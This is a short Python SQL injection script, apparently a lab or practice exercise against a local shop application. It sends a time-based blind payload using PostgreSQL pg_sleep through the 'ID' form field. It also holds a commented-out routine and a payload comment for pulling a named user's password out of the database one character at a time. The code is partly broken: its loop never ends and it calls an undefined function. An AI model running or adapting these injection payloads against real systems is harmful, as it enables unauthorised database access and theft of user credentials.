import requests
import string
import time
# " and (select length(\"PassWord\") from public.\"user\" where \"UserName\"='thanh')={length}-- 
def get_time(url):
    length = 1
    while True:
        data = {'ID':f"8';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--'"}
        start = time.time()
        r = requests.post(url=url,data=data)
        end = time.time()
        during = end-start
        if(during>10):
            print("cham qua")
        
# def exploit(url):
#     length = get_length(url=url)
#     wordlist = string.printable[:62]
#     password = ''
#     for i in range(1,length+1):
#         for x in wordlist:
#             data = {'ID':f"8'and substr((select \"PassWord\" from public.\"user\" where \"UserName\"='thanh'),{i},1)='{x}' --"}
#             r = requests.post(url=url,data=data)
#             if 'Danh sach la:' in r.text:
#                 password += x
#                 print(f'[+] Found char of password: {x} --> Password: {password}')
#                 break

if __name__=="__main__":
    url = 'http://localhost:1337/HTShop/index'
    get_time(url=url)    